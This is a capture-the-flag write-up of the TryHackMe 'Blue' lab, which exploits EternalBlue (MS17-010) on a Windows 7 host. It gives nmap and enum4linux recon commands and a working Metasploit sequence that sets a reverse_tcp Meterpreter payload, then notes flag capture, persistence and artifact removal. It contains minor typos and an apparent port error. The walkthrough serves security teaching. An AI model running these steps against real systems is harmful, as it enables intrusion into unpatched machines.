# TryHackMe-Blue

## Summary
"Blue" is a beginner-friendly Windows machine that introduces key red team concepts: service enumeration, SMB exploitation, and post-exploitation with Metasploit. This box simulates a vulnerable host affected by EternalBlue (MS17-010).

## 🛠Tools Used
- `nmap`
- `enum4linux`
- `Metasploit`
- `smbclient`

## Target IP
`10.10.58.122`


## 1. Reconnaissance

```bash
nmap -sC -sV -oN blue-nmap.txt [IP]
Nmap revealed:
  -Ports 138, 445 (SMB)
  -Windows 7 OS guess
  -vulnerability likely to MS17-010
```


## 2. Enumeration

enum4linux -a [IP]
`Found usernames, shared drives, and Windows version. Confirmed it's vulnerable to EternalBlue.`


## 3. Exploitation

msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS [IP]
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
`Successfully gained a Meterpreter shell. Verified user access.`


## 4. Post-Exploitation
```
Explored file syetem
Located and captured the user.txt and root.txt flags
Verified persistance and removed artifacts
```


## Conclusion

```
EternalBlue remains a critical reminder of unpatched systerm
SMB enunmertation is essential before launching exploits
Metasploit simplifies exploitation but should be used responsibly
```
